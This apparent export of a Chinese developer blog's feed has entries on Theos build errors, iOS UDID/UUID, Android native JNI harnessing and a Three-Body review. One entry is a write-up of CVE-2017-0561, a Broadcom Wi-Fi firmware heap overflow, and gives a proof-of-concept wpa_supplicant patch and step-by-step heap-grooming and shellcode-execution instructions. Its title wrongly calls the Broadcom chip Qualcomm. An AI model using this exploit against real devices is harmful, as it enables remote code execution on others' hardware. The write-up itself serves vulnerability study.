<h1 id="Bugs"><a href="#Bugs" class="headerlink" title="Bugs"></a>Bugs</h1><h2 id="lzma"><a href="#lzma" class="headerlink" title="lzma"></a>lzma</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;dpkg-deb: error: obsolete compression type &apos;lzma&apos;; use xz instead&apos;</div></pre></td></tr></table></figure>
<p><a href="http://bbs.iosre.com/t/daemon/5847" target="_blank" rel="external">解决方案</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">修改opt/theos/makefiles/package/deb.mk</div><div class="line">第六行：THEOSPLATFORM_DPKG_DEB_COMPRESSION ?= lzma</div><div class="line">把最后lzma 改成 xz 就可以了</div></pre></td></tr></table></figure></p>
<h2 id="dpkg-降级"><a href="#dpkg-降级" class="headerlink" title="dpkg 降级"></a>dpkg 降级</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dpkg: error processing archive /tmp/_theos_install.deb (--install):</div><div class="line"> subprocess dpkg-deb --fsys-tarfile returned error exit status 2</div><div class="line">Errors were encountered while processing:</div><div class="line"> /tmp/_theos_install.deb</div><div class="line">make: *** [internal-install] Error 1</div></pre></td></tr></table></figure>
<p><a href="http://bbs.iosre.com/t/theos-make-install/6706" target="_blank" rel="external">解决方案</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">brew remove dpkg</div><div class="line">HOMEBREW_NO_AUTO_UPDATE=1 brew install https://raw.githubusercontent.com/Homebrew/homebrew-core/7a4dabfc1a2acd9f01a1670fde4f0094c4fb6ffa/Formula/dpkg.rb</div><div class="line">brew pin dpkg</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="ios" scheme="http://yoursite.com/tags/ios/"/>
    
      <category term="tweak" scheme="http://yoursite.com/tags/tweak/"/>
    
  </entry>
  
  <entry>
    <title>iOS开发中的UDID和UUID</title>
    <link href="http://yoursite.com/2017/04/28/%E5%BC%80%E5%8F%91/iOS%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84UDID%E5%92%8CUUID/"/>
    <id>http://yoursite.com/2017/04/28/开发/iOS开发中的UDID和UUID/</id>
    <published>2017-04-28T02:34:24.000Z</published>
    <updated>2017-05-20T04:37:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>转载自： <a href="http://blog.csdn.net/chenyufeng1991/article/details/51531491" target="_blank" rel="external">http://blog.csdn.net/chenyufeng1991/article/details/51531491</a></p>
<hr>
<a id="more"></a>
<h1 id="UDID-Unique-Device-Identifier-设备唯一标识符"><a href="#UDID-Unique-Device-Identifier-设备唯一标识符" class="headerlink" title="UDID (Unique Device Identifier :设备唯一标识符)"></a>UDID (Unique Device Identifier :设备唯一标识符)</h1><p>自从iOS5之后，苹果就禁止了通过代码访问UDID。</p>
<p>iOS 5之前，获取 UDID<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[[UIDevice current] uniqueIdenfier]</div></pre></td></tr></table></figure></p>
<p>iOS 5之后，使用identifierForVendor 代替 UDID<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NSUUID *uuid = [UIDevice currentDevice].identifierForVendor;</div><div class="line">NSLog(@&quot;uuid 1 = %@&quot;,uuid.UUIDString);</div></pre></td></tr></table></figure></p>
<p>这个identifierForVendor是一种应用加设备绑定产生的标识符，相当于是：Z(identifierForVendor) = X(某应用) + Y(某设备)。但是无论A应用在同一台手机上安装卸载多少次， identifierForVendor 的值都不变。</p>
<h2 id="禁止使用-UDID-是处于保护用户隐私的目的。"><a href="#禁止使用-UDID-是处于保护用户隐私的目的。" class="headerlink" title="禁止使用 UDID 是处于保护用户隐私的目的。"></a>禁止使用 UDID 是处于<a href="http://www.evolife.cn/html/2010/56245.html" target="_blank" rel="external">保护用户隐私</a>的目的。</h2><blockquote>
<p>在很早之前，苹果宣称如果第三方应用开发者继续分享或者使用iPhone、Mac、AppleWatch的UDID的话，那么他们的应用将会禁止上架。为什么苹果要在应用中禁止使用呢？那是因为隐私问题。比如我开发了5款App，很多用户都下载了这5款App并使用。如果我能轻易的获取这些用户的UDID，其实我能拼凑出用户的很多信息。由于UDID本身的隐私属性，之前常常用来做第三方统计和其他的目的。当然现在也有人使用MAC地址来识别设备，因为MAC地址也唯一的识别了一台设备并且不会被修改，不知道以后苹果会对此如何操作。</p>
</blockquote>
<h1 id="UUID-Universally-Unique-Identifier-通用唯一标识符"><a href="#UUID-Universally-Unique-Identifier-通用唯一标识符" class="headerlink" title="UUID (Universally Unique Identifier :通用唯一标识符)"></a>UUID (Universally Unique Identifier :通用唯一标识符)</h1><p>代码获取 UUID<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">for (int i=0; i &lt; 10; i++)</div><div class="line">&#123;</div><div class="line">    NSString *uuid = [NSUUID UUID].UUIDString;</div><div class="line">    NSLog(@&quot;uuid 2 = %@&quot;, uuid);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>通过运行程序可以发现，循环10次，每一次打印的值都是不一样的，当然循环的再多，这个值永远不会出现两个一样的值。所以从某种程序上来说，UUID跟你的设备没有什么关系了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转载自： &lt;a href=&quot;http://blog.csdn.net/chenyufeng1991/article/details/51531491&quot;&gt;http://blog.csdn.net/chenyufeng1991/article/details/51531491&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2017-0561高通wifi-soc的RCE攻击案例</title>
    <link href="http://yoursite.com/2017/04/27/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2017-0561-%E9%AB%98%E9%80%9Awifi-soc%E7%9A%84RCE%E6%94%BB%E5%87%BB%E6%A1%88%E4%BE%8B/"/>
    <id>http://yoursite.com/2017/04/27/漏洞利用/CVE-2017-0561-高通wifi-soc的RCE攻击案例/</id>
    <published>2017-04-27T02:40:57.000Z</published>
    <updated>2017-04-28T02:48:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>Title: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1046" target="_blank" rel="external">CVE-2017-0561 issues</a></p>
<p>Core Skill：远程攻击 wpa_supplicant wifi 模块, 存在堆溢出漏洞,精心构造数据可以远程提权。</p>
<a id="more"></a>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>漏洞在高通的 BCM 固件中。当网络中有设备发送 wifi TDLS teardow请求时，网络中的设备会自动接受请求包，然后校验teardown 请求包。</p>
<p>MIG ：message integrity code  消息完整性代码<br>首先要建立 TDLS 连接，当其中一台设备发送 teardown 请求时，另一方会自动接收</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>校验完成以后，在处理请求包之前会校验MIC，调用wlc_tdls_cal_teardown_mic_chk函数。<br>伪代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">void *wlc_tdls_cal_teardown_mic_chk() &#123;</div><div class="line">uint8_t* buffer = malloc(256);</div><div class="line">...</div><div class="line">uint8_t* linkid_ie = bcm_parse_tlvs(..., 101);</div><div class="line">memcpy(buffer, linkid_ie, 0x14);</div><div class="line">...</div><div class="line">uint8_t* ft_ie = bcm_parse_tlvs(..., 55);       // 提取Fast Transition IE （55）信息元素</div><div class="line">memcpy(buf + 0x18, ft_ie, ft_ie[1] + 2);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>因为在拷贝 FTIE 之前没有校验数据报中 FTIE 的长度，所以在 memcpy 时会导致堆溢出。</p>
<h1 id="POC-使用步骤："><a href="#POC-使用步骤：" class="headerlink" title="POC 使用步骤："></a>POC 使用步骤：</h1><ol>
<li>需要下载  wpa_supplicant 2.6</li>
<li>安装补丁文件？》？》？</li>
<li>编译 wpa_supplicant （支持 TDLS）</li>
<li>使用 wpa_supplicant 链接到网路 </li>
<li>链接 到 wpa_cli:    要攻击的设备？？<pre><code>1. 使用 &quot;TDLS_SETUP   &lt;MAC_ADDRESS_OF_PEER&gt;”设置到BCM对等体的TDLS连接
2. 使用“TDLS_TEARDOWN &lt;MAC_ADDRESS_OF_PEER&gt;”拆除连接
</code></pre>(其中MAC_ADDRESS_OF_PEER是具有与同一网络相关联的BCM SoC的对等体的MAC地址）</li>
</ol>
<h2 id="Patch-文件"><a href="#Patch-文件" class="headerlink" title="Patch 文件"></a>Patch 文件</h2><p>这份 patch 文件 就是一个 poc, 通过修改 wpa_supplicant 代码，在构造 teardown 请求包时，故意让 ftie 指向的堆比接受的256 字节大。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">--- wpa_supplicant-2.6/src/rsn_supp/tdls.c     2016-10-02 19:51:11.000000000 +0100</div><div class="line">+++ TDLSTeardownModification/wpa_supplicant-2.6/src/rsn_supp/tdls.c     2016-12-19 12:15:28.000000000 +0000</div><div class="line">@@ -765,15 +765,7 @@</div><div class="line">     wpa_printf(MSG_DEBUG, &quot;TDLS: TDLS Teardown for &quot; MACSTR,</div><div class="line">             MAC2STR(addr));</div><div class="line"></div><div class="line">// 删除计算 ielen 的代码， 这里是用来计算 ftie 堆的大小</div><div class="line">-     ielen = 0;</div><div class="line">-     if (wpa_tdls_get_privacy(sm) &amp;&amp; peer-&gt;tpk_set &amp;&amp; peer-&gt;tpk_success) &#123;</div><div class="line">-          /* To add FTIE for Teardown request and compute MIC */</div><div class="line">-          ielen += sizeof(*ftie);</div><div class="line">-#ifdef CONFIG_TDLS_TESTING</div><div class="line">-          if (tdls_testing &amp; TDLS_TESTING_LONG_FRAME)</div><div class="line">-               ielen += 170;</div><div class="line">-#endif /* CONFIG_TDLS_TESTING */</div><div class="line">-     &#125;</div><div class="line">+     ielen = 257;        // 溢出1个字节</div><div class="line"></div><div class="line">     rbuf = os_zalloc(ielen + 1);</div><div class="line">     if (rbuf == NULL)</div><div class="line">@@ -785,11 +777,14 @@</div><div class="line"></div><div class="line">     ftie = (struct wpa_tdls_ftie *) pos;</div><div class="line">     ftie-&gt;ie_type = WLAN_EID_FAST_BSS_TRANSITION;</div><div class="line">+     ftie-&gt;ie_len = 255;            // 忽略了 wpa_tdls_ftie 头部2个字节。实际在计算 mic 时，读取的是 257 个字节。</div><div class="line">+     os_memset(pos + 2, 0xFF, 255);</div><div class="line">+</div><div class="line">     /* Using the recent nonce which should be for CONFIRM frame */</div><div class="line">     os_memcpy(ftie-&gt;Anonce, peer-&gt;rnonce, WPA_NONCE_LEN);</div><div class="line">     os_memcpy(ftie-&gt;Snonce, peer-&gt;inonce, WPA_NONCE_LEN);</div><div class="line">-     ftie-&gt;ie_len = sizeof(struct wpa_tdls_ftie) - 2;</div><div class="line">-     pos = (u8 *) (ftie + 1);</div><div class="line">+</div><div class="line">+     pos += 257;</div><div class="line">#ifdef CONFIG_TDLS_TESTING</div><div class="line">     if (tdls_testing &amp; TDLS_TESTING_LONG_FRAME) &#123;</div><div class="line">          wpa_printf(MSG_DEBUG, &quot;TDLS: Testing - add extra subelem to &quot;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">struct wpa_tdls_ftie &#123;</div><div class="line">     u8 ie_type; /* FTIE */</div><div class="line">     u8 ie_len;        // 这里会 忽略头2个字节</div><div class="line">     u8 mic_ctrl[2];</div><div class="line">     u8 mic[TDLS_MIC_LEN];  //TDLS_MIC_LEN  16</div><div class="line">     u8 Anonce[WPA_NONCE_LEN]; /* Responder Nonce in TDLS */   WPA_NONCE_LEN 32</div><div class="line">     u8 Snonce[WPA_NONCE_LEN]; /* Initiator Nonce in TDLS */</div><div class="line">     /* followed by optional elements */</div><div class="line">&#125; STRUCT_PACKED;</div></pre></td></tr></table></figure>
<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>我已经能够在BCM4339芯片上验证此漏洞，运行版本为6.37.34.40（如Nexus 5所示）。不过，我相信这个漏洞的范围包括更广泛的Broadcom SoC和版本。</p>
<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><p>直接 运行exploit.py  可以在 WiFi  加密狗上 任意代码执行。</p>
<p>配置步骤：</p>
<ol>
<li>和目标设备创建 TDLS 链接</li>
<li>发送构造的 teardown 请求给目标，触发堆溢出漏洞</li>
<li>创建一个新的 TDLS 链接，使用精心设计的参数，导致空闲链表中的一个chunk覆盖另一个chunk ？？？</li>
<li>发送 action code == 127 的 TDLS 请求帧<ol>
<li>精心构造 TDLS 请求帧的大小，要让其和空闲链表中另一个 chunk 发生覆盖</li>
<li>精心构造 请求数据，保证 free chunk 的指针指向，固件初始化时创建的定时器</li>
</ol>
</li>
<li>发送另一个 action code == 127 的 TDLS 请求帧<ol>
<li>精心构造 TDLS 请求帧的大小，这个帧将被放置在 定时器的头部 （因为再次 malloc 时，返回的是定时器的内存地址）</li>
<li>精心构造 请求数据，保证我们能覆盖定时器的函数指针，这里我们将指针指向堆结尾处。</li>
</ol>
</li>
<li>发送一个 action code == 127 的较大 TDLS 请求帧<ol>
<li>精心构造 请求数据，使其包含我们要执行的 shellcode</li>
</ol>
</li>
<li>由于堆内存分配以后都会被初始化为0， 而“Thumb”中为“00 00”为NOP（MOVS R0，R0），这就是天然的滑板指令。所以我们跳到shellcode 之前的位置，不会有任何影响。<br>整个攻击，会在下一次定时器到期，在固件上执行我们的 shellcode。</li>
</ol>
<!--
### 好消息
因为 高通生产的 wifi soc 可以独立处理 物理层和链路层的工作，不需要 OS 参与。所以在单独的芯片上不会受到 SMEP、PXN、NX 等防护措施的影响。可以在堆上执行 shellcode。
-->
<h3 id="ChangeLog"><a href="#ChangeLog" class="headerlink" title="ChangeLog"></a>ChangeLog</h3><table>
<thead>
<tr>
<th>Time</th>
<th>Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>2017-4-21</td>
<td>测试 android N5</td>
</tr>
<tr>
<td></td>
<td>测试 ios &lt;=10.3</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Title: &lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=1046&quot;&gt;CVE-2017-0561 issues&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Core Skill：远程攻击 wpa_supplicant wifi 模块, 存在堆溢出漏洞,精心构造数据可以远程提权。&lt;/p&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="pi" scheme="http://yoursite.com/tags/pi/"/>
    
  </entry>
  
  <entry>
    <title>《三体》</title>
    <link href="http://yoursite.com/2017/04/19/%E3%80%8A%E4%B8%89%E4%BD%93%E3%80%8B/"/>
    <id>http://yoursite.com/2017/04/19/《三体》/</id>
    <published>2017-04-19T08:05:17.000Z</published>
    <updated>2017-05-23T13:14:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>人类对抗挫折，再强大的对手都有解决的办法。解决不了就说明有 思维的局限，就类似三体-1中举得栗子，农场主假说 &amp; 射手理论, 说明自然界的个体 容易被 经验 和 自身的认知 带入陷阱中。<br><a id="more"></a></p>
<p><code>三体-I-基石</code>，看完以后感觉良好。但是从 I 过渡到 <code>II-黑暗森林 上部(面壁者)</code>的时候突然出现了几个人，而且文章的内容也突然变换了场景感觉很不适应。<br>这可能就是 资生读者口中的”牛逼科幻”, 据说这样的书还有很多比如：攻壳(qiao)机动队。</p>
<p>于是 再次将那个80多分钟的视频剪辑看了一遍，看完 <code>黑暗森林</code>就不敢继续向下看了，已经开始看不懂了。</p>
<p>看完了大概30分钟的剧情，最后到 “罗辑给自己挖好坟墓，然后做出了竟然的举动，他要挟三体人要炸太阳将太阳系的坐标发送到全宇宙。”这<br>里就是小说的第一个高潮部分，这是人类第一次和三体人对话中占据上风。<br>总结一下我印象最深刻的感受：</p>
<blockquote>
<p>人类对抗挫折，再强大的对手都有解决的办法。解决不了就说明有 思维的局限，就类似三体-1中举得栗子–农场主假说 &amp; 射手理论, 说明自然界的个体 容易被 经验 和 自身的认知 带入陷阱中。</p>
</blockquote>
<p><a href="https://www.zhihu.com/question/31245113" target="_blank" rel="external">https://www.zhihu.com/question/31245113</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;人类对抗挫折，再强大的对手都有解决的办法。解决不了就说明有 思维的局限，就类似三体-1中举得栗子，农场主假说 &amp;amp; 射手理论, 说明自然界的个体 容易被 经验 和 自身的认知 带入陷阱中。&lt;br&gt;
    
    </summary>
    
      <category term="读书" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
      <category term="小说" scheme="http://yoursite.com/tags/%E5%B0%8F%E8%AF%B4/"/>
    
  </entry>
  
  <entry>
    <title>玩转 android 虚拟机</title>
    <link href="http://yoursite.com/2017/04/19/%E6%95%99%E7%A8%8B/%E7%8E%A9%E8%BD%AC-android-%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    <id>http://yoursite.com/2017/04/19/教程/玩转-android-虚拟机/</id>
    <published>2017-04-19T07:38:47.000Z</published>
    <updated>2017-05-23T13:23:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>Title: <a href="https://calebfenton.github.io/2017/04/14/calling_jni_functions_with_java_object_arguments_from_the_command_line/" target="_blank" rel="external">Calling JNI Functions with Java Object Arguments from the Command Line</a></p>
<p>Core Skill: 在 native 层创建 Android 虚拟机，并调用 jni 方法。</p>
<p><a href="https://calebfenton.github.io/" target="_blank" rel="external">Caleb Fenton’s Blog</a>中包含很多关于 android 开发的技术，特别是虚拟机相关的技术。<strong>介绍的非常详细</strong></p>
<a id="more"></a>
<p>这里介绍 <a href="https://calebfenton.github.io" target="_blank" rel="external">Caleb Fenton’s Blog</a>中关于 Android 虚拟机的系列文章，对文章中的技术做汇总和实验。</p>
<p>目前作者给出了 如下2篇文章：</p>
<ul>
<li><a href="https://calebfenton.github.io/2017/04/05/creating_java_vm_from_android_native_code/" target="_blank" rel="external">Creating a Java VM from Android Native Code</a><br>介绍如何通过编写 Native 可执行文件，创建Android VM；本质就是调用 libdvm.so 中未开放的代码。</li>
<li><a href="https://calebfenton.github.io/2017/04/14/calling_jni_functions_with_java_object_arguments_from_the_command_line/" target="_blank" rel="external">Calling JNI Functions with Java Object Arguments from the Command Line</a></li>
</ul>
<p>重点介绍第二篇 文章， 因为第一篇只是一个技术基础。第二篇包含了一些案例 更有价值一些。</p>
<h1 id="从-navice-层创建-Android-VM"><a href="#从-navice-层创建-Android-VM" class="headerlink" title="从 navice 层创建 Android VM"></a>从 navice 层创建 Android VM</h1><p>在介绍第二篇之前先将第一篇公布的完整代码公布出来。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*JNI_CreateJavaVM_t)</span><span class="params">(<span class="keyword">void</span> *, <span class="keyword">void</span> *, <span class="keyword">void</span> *)</span></span>;</div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">jint</span> <span class="params">(*registerNatives_t)</span><span class="params">(JNIEnv* env, jclass clazz)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">init_jvm</span><span class="params">(JavaVM **p_vm, JNIEnv **p_env)</span> </span>&#123;</div><div class="line">    <span class="comment">// https://android.googlesource.com/platform/frameworks/native/+/ce3a0a5/services/surfaceflinger/DdmConnection.cpp</span></div><div class="line">    JavaVMOption opt[<span class="number">4</span>];</div><div class="line">    opt[<span class="number">0</span>].optionString = <span class="string">"-Djava.class.path=/data/local/tmp/shim_app.apk"</span>;</div><div class="line">    opt[<span class="number">1</span>].optionString = <span class="string">"-agentlib:jdwp=transport=dt_android_adb,suspend=n,server=y"</span>;</div><div class="line">    opt[<span class="number">2</span>].optionString = <span class="string">"-Djava.library.path=/data/local/tmp"</span>;</div><div class="line">    opt[<span class="number">3</span>].optionString = <span class="string">"-verbose:jni"</span>; <span class="comment">// may want to remove this, it's noisy</span></div><div class="line">    JavaVMInitArgs args;</div><div class="line">    args.version = JNI_VERSION_1_6;</div><div class="line">    args.options = opt;</div><div class="line">    args.nOptions = <span class="number">4</span>;</div><div class="line">    args.ignoreUnrecognized = JNI_FALSE;</div><div class="line">    <span class="keyword">void</span> *libdvm_dso = dlopen(<span class="string">"libdvm.so"</span>, RTLD_NOW);</div><div class="line">    <span class="keyword">void</span> *libandroid_runtime_dso = dlopen(<span class="string">"libandroid_runtime.so"</span>, RTLD_NOW);</div><div class="line">    <span class="keyword">if</span> (!libdvm_dso || !libandroid_runtime_dso) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">    &#125;</div><div class="line">    JNI_CreateJavaVM_t JNI_CreateJavaVM;</div><div class="line">    JNI_CreateJavaVM = (JNI_CreateJavaVM_t) dlsym(libdvm_dso, <span class="string">"JNI_CreateJavaVM"</span>);</div><div class="line">    <span class="keyword">if</span> (!JNI_CreateJavaVM) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">-2</span>;</div><div class="line">    &#125;</div><div class="line">    registerNatives_t registerNatives;</div><div class="line">    registerNatives = (registerNatives_t) dlsym(libandroid_runtime_dso, <span class="string">"Java_com_android_internal_util_WithFramework_registerNatives"</span>);</div><div class="line">    <span class="keyword">if</span> (!registerNatives) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">-3</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (JNI_CreateJavaVM(&amp;(*p_vm), &amp;(*p_env), &amp;args)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">-4</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (registerNatives(*p_env, <span class="number">0</span>)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">-5</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h1 id="在命令行调用-JNI-函数（参数可以包括-Java-对象）"><a href="#在命令行调用-JNI-函数（参数可以包括-Java-对象）" class="headerlink" title="在命令行调用 JNI 函数（参数可以包括 Java 对象）"></a>在命令行调用 JNI 函数（参数可以包括 Java 对象）</h1><p>当破解或者分析恶意代码时，可能关键的值（字符串）是在 Native层计算出来的，这时候我们有几种办法获取native 函数的返回值。</p>
<ol>
<li>hook native函数   [简单、不稳定、不方便]</li>
<li>静态分析 native 函数算法，重写方法    [复杂]</li>
<li>动态调试     [更不方便]</li>
<li>插桩         [不方便、校验完整性的防护]</li>
<li>创建一个可执行文件，加载目标 so 调用目标函数。通过命令行传递参数给目标函数。     [简单、有局限（无法创建 JNIEnv参数）]</li>
<li>….</li>
</ol>
<p>下面我们会介绍 本文的技术来解决这个调用 jni 函数的问题。</p>
<p>首先下载我们的<a href="https://github.com/CalebFenton/native-harness-target" target="_blank" rel="external">实验app</a>, 使用下面的方法编译 apk.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/CalebFenton/native-harness-target.git</div><div class="line">cd native-harness-target</div><div class="line">echo &apos;ndk.dir=$ANDROID_NDK&apos; &gt; local.properties</div><div class="line">echo &apos;sdk.dir=$ANDROID_SDK&apos; &gt;&gt; local.properties</div><div class="line">./gradlew build</div></pre></td></tr></table></figure></p>
<p>APKs 输出目录：<code>app/build/outputs/apk/</code>。</p>
<p>实验的设备：Nexus5<br>系统版本：android 6.0.1</p>
<h2 id="Harness-服务端工具"><a href="#Harness-服务端工具" class="headerlink" title="Harness 服务端工具"></a>Harness 服务端工具</h2><p>Harness的灵感来自 shim项目，shim 的功能是加载 library 并调用其 JNI_OnLoad 函数。这样就简化了调试工作，现在只需要让调试器去启动 shim 并通过参数传递要目标 library，然后使用调试器下断点并 绕过 JNI_OnLoad。</p>
<p>首先我们需要使用上一节介绍的技术，在 native 层创建 java vm，并将 JavaVM 实例传递给 JNI_OnLoad 函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span>(<span class="string">" [+] Initializing JavaVM Instance\n"</span>);</div><div class="line">JavaVM *vm = <span class="literal">NULL</span>;</div><div class="line">JNIEnv *env = <span class="literal">NULL</span>;</div><div class="line"><span class="keyword">int</span> status = init_jvm(&amp;vm, &amp;env);</div><div class="line"><span class="keyword">if</span> (status == <span class="number">0</span>) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">" [+] Initialization success (vm=%p, env=%p)\n"</span>, vm, env);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">" [!] Initialization failure (%i)\n"</span>, status);</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">" [+] Calling JNI_OnLoad\n"</span>);</div><div class="line">onLoadFunc(vm, <span class="literal">NULL</span>);</div></pre></td></tr></table></figure></p>
<p>最终在代码中开启一个 socket， 通过这个 socket 读取参数作为目标函数的参数。使用 python 脚本可以很容易与它进行交互。</p>
<p>python 脚本就是 在PC 上执行的 <strong>客户端</strong>了。</p>
